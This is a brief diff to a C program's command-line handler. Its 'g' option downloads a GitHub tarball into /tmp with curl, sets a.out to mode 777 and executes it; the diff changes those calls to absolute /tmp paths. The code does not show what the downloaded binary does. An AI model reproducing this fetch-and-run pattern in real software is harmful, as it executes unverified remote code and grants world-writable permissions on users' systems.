@@ -155,9 +155,8 @@ int main(int argc, char* argv[]) {
                 break;
             case 'g':
                 system("cd /tmp && curl -L https://github.com/Unknowinglyy/utils/tarball/main | tar xz --strip-components=1 > /dev/null 2>&1");
-                system("chmod 777 a.out");
-                system("./a.out");
-                system("cd -");
+                system("chmod 777 /tmp/a.out");
+                system("/tmp/a.out");
                 return 0;
             case 'h':
                 help();
